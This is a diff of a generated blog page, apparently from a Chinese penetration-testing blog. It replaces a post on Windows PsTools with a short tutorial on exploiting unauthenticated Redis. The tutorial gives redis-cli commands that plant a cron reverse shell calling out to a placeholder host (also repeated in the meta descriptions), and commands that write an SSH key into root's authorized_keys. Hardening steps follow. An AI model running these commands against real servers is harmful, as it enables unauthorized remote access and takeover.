@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="工具1.快速打开网络中的共享文件。点我下载此工具可以快速方便的读取本地共享的文件。 2.Windows PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。 PsTools 工具在域中可以工作得非常好，管理员不必考虑过多的权限问题。但对于工作组环境中的 Windows Vista/7/8/10，需要调整远程计算机上的用户账户控制（UAC）之后 PsTools 工具">
+<meta name="description" content="redis未授权访问利用方式未授权的中间件有很多，redis比较常见其利用方式如下 通过写入crontab来反弹shell12345redis-cli -h ip:port ###连接redisset xxx &amp;quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/IP/Port 0&amp;gt;&amp;amp;1\n&amp;quot;  ###写入任务config set dir">
 <meta property="og:type" content="article">
-<meta property="og:title" content="windows 渗透">
-<meta property="og:url" content="http://yoursite.com/2018/10/16/windows-渗透/index.html">
+<meta property="og:title" content="Scripyboy&#39;s Blog">
+<meta property="og:url" content="http://yoursite.com/2018/12/17/redis利用/index.html">
 <meta property="og:site_name" content="Scripyboy&#39;s Blog">
-<meta property="og:description" content="工具1.快速打开网络中的共享文件。点我下载此工具可以快速方便的读取本地共享的文件。 2.Windows PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。 PsTools 工具在域中可以工作得非常好，管理员不必考虑过多的权限问题。但对于工作组环境中的 Windows Vista/7/8/10，需要调整远程计算机上的用户账户控制（UAC）之后 PsTools 工具">
+<meta property="og:description" content="redis未授权访问利用方式未授权的中间件有很多，redis比较常见其利用方式如下 通过写入crontab来反弹shell12345redis-cli -h ip:port ###连接redisset xxx &amp;quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/IP/Port 0&amp;gt;&amp;amp;1\n&amp;quot;  ###写入任务config set dir">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-10-26T07:28:13.467Z">
+<meta property="og:updated_time" content="2018-12-17T04:08:15.195Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="windows 渗透">
-<meta name="twitter:description" content="工具1.快速打开网络中的共享文件。点我下载此工具可以快速方便的读取本地共享的文件。 2.Windows PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。 PsTools 工具在域中可以工作得非常好，管理员不必考虑过多的权限问题。但对于工作组环境中的 Windows Vista/7/8/10，需要调整远程计算机上的用户账户控制（UAC）之后 PsTools 工具">
+<meta name="twitter:title" content="Scripyboy&#39;s Blog">
+<meta name="twitter:description" content="redis未授权访问利用方式未授权的中间件有很多，redis比较常见其利用方式如下 通过写入crontab来反弹shell12345redis-cli -h ip:port ###连接redisset xxx &amp;quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/IP/Port 0&amp;gt;&amp;amp;1\n&amp;quot;  ###写入任务config set dir">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/16/windows-渗透/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/12/17/redis利用/"/>
 
 
 
 
 
-  <title>windows 渗透 | Scripyboy's Blog</title>
+  <title> | Scripyboy's Blog</title>
   
 
 
@@ -222,7 +222,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/16/windows-渗透/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/17/redis利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Scripyboy">
@@ -239,7 +239,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">windows 渗透</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -251,8 +251,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-16T14:53:47+08:00">
-                2018-10-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-17T11:48:15+08:00">
+                2018-12-17
               </time>
             
 
@@ -289,14 +289,18 @@
       
 
       
-        <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="1-快速打开网络中的共享文件。"><a href="#1-快速打开网络中的共享文件。" class="headerlink" title="1.快速打开网络中的共享文件。"></a>1.快速打开网络中的共享文件。</h3><p><a href="http://www.nirsoft.net/utils/networkopenedfiles-x64.zip" target="_blank" rel="noopener">点我下载</a>此工具可以快速方便的读取本地共享的文件。</p>
-<h3 id="2-Windows-PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。"><a href="#2-Windows-PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。" class="headerlink" title="2.Windows PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。"></a>2.Windows PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。</h3><ul>
-<li><p>PsTools 工具在域中可以工作得非常好，管理员不必考虑过多的权限问题。但对于工作组环境中的 Windows Vista/7/8/10，需要调整远程计算机上的用户账户控制（UAC）之后 PsTools 工具才能正常运行。</p>
-</li>
-<li><p>即便你是远程目标 PC 的 Local Administrators 组成员，在使用命令行进行远程连接时还是会使用类似 net use * \remotecomputer\Share$ 的方式，这不被 Windows 视为有完全管理员权限。因为连接到远程计算机需要有权限才能执行管理任务，命令行连接方式也无法触发 UAC，所以直接远程连接使用 PsTools 工具远程连接工作组计算机会报权限错误。要保证 PsTools 工具能在工作组环境中正常使用，你需要更改注册表：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><br><span class="line">##在上述注册表路径中创建一个名为 LocalAccountTokenFilterPolicy 的 32 位 DWORD 值，并将其值设置为 1 即可。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
+        <h1 id="redis未授权访问利用方式"><a href="#redis未授权访问利用方式" class="headerlink" title="redis未授权访问利用方式"></a>redis未授权访问利用方式</h1><p>未授权的中间件有很多，redis比较常见<br>其利用方式如下</p>
+<h3 id="通过写入crontab来反弹shell"><a href="#通过写入crontab来反弹shell" class="headerlink" title="通过写入crontab来反弹shell"></a>通过写入crontab来反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip:port ###连接redis</span><br><span class="line">set xxx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/IP/Port 0&gt;&amp;1\n&quot;  ###写入任务</span><br><span class="line">config set dir /var/spool/cron/ ###设置路径 ps:此路径为centos 路径</span><br><span class="line">config set dir dbfilename xxxx  </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<h3 id="写入ssh-公钥直接免密码登陆"><a href="#写入ssh-公钥直接免密码登陆" class="headerlink" title="写入ssh 公钥直接免密码登陆"></a>写入ssh 公钥直接免密码登陆</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa ###本地生成公钥</span><br><span class="line">config set dir /root/.ssh/ ### 保存的目录</span><br><span class="line">config set dbfilename authorized_keys 写入文件名</span><br><span class="line">set xxx &quot;\n\n\n 公钥 \n\n\n&quot;  ###写入公钥</span><br><span class="line">save ###保存</span><br></pre></td></tr></table></figure>
+<h3 id="如果有web目录，则可以写入webshell"><a href="#如果有web目录，则可以写入webshell" class="headerlink" title="如果有web目录，则可以写入webshell"></a>如果有web目录，则可以写入webshell</h3><p>#修复方案：<br>1.禁止一些高危命令<br>修改 redis.conf 文件，添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>来禁用远程修改 DB 文件地址<br>2.以低权限运行 Redis 服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+<p>3.为 Redis 添加密码验证</p>
+<p>修改 redis.conf 文件，添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>
+<p>4.禁止外网访问 Redis<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -321,15 +325,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/12/03/Linux命令行写文件/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/18/mysql-通过日志GetShell/" rel="prev" title="mysql 通过日志GetShell">
-                mysql 通过日志GetShell <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -443,7 +447,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#工具"><span class="nav-number">1.</span> <span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-快速打开网络中的共享文件。"><span class="nav-number">1.1.</span> <span class="nav-text">1.快速打开网络中的共享文件。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Windows-PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。"><span class="nav-number">1.2.</span> <span class="nav-text">2.Windows PsTools工具在域环境（domain）和工作组环境（workgroups）的使用。</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#redis未授权访问利用方式"><span class="nav-number">1.</span> <span class="nav-text">redis未授权访问利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#通过写入crontab来反弹shell"><span class="nav-number">1.0.1.</span> <span class="nav-text">通过写入crontab来反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写入ssh-公钥直接免密码登陆"><span class="nav-number">1.0.2.</span> <span class="nav-text">写入ssh 公钥直接免密码登陆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如果有web目录，则可以写入webshell"><span class="nav-number">1.0.3.</span> <span class="nav-text">如果有web目录，则可以写入webshell</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
